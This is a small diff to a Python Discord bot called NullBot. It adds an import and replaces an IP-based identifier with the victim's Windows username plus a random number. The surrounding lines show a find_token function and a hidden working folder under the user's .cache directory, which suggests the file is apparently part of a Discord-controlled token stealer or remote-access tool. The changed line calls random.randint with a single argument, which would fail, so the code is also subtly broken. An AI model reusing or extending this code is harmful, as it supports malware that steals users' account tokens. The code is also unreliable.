@@ -6,7 +6,7 @@ from disnake.ext import commands
 
 from datetime import datetime
 from socket import create_connection
-import os, re, aiohttp, requests
+import os, re, aiohttp, requests, random
 
 ###################################################################
 def IP():
@@ -72,7 +72,7 @@ def find_token(self):
 
 original_dir = os.getcwd()
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
-ip_addr = IP()
+ip_addr = os.getenv("username") + str(random.randint(8000))
 
 class NullBot(commands.InteractionBot):
     def __init__(self, **options):
